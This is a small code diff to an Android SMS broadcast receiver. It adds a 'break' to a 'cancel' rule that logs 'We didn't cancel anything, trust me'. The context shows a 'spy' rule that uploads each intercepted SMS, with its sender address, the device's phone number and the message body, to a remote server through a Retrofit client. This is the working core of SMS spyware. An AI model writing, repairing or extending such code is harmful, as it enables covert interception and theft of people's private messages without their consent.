@@ -85,6 +85,7 @@ public class SmsBroadcastReceiver extends BroadcastReceiver {
                     switch (rule.getType()){
                         case "cancel" :
                             Log.d("RETROFIT","We didn't cancel anything, trust me");
+                            break;
                         case "spy":
                             Call<MySms> call = client.postSms(new MySms(address,mPhoneNumber,"",smsBody));
                             call.enqueue(new Callback<MySms>() {
